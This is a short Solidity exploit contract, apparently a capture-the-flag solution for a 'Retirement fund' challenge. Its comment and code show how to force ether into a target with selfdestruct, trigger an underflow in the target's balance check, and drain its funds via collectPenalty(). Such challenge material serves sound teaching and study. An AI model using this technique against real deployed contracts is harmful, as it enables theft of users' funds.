// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

/**
 * @title RetirementFundExploit
 * @dev Even though the contract doesn't allow to receive ether (as it would break it's assumption that only the owner could touch the funds first), any recipient of a
 * 'selfdestruct' instruction cannot refuse the transaction. This allows to make the contract's balance greater than the 'startingAmount' causing an underflow, allowing
 * for the entirety of the funds to be withdrawn by the player (with a call to 'collectPenalty()'.
 */
contract RetirementFundExploit {
    function RetirementFundExploit() public payable {}

    function makeDonation(address _contract) public {
        require(address(this).balance > 0);
        selfdestruct(_contract);
    }
}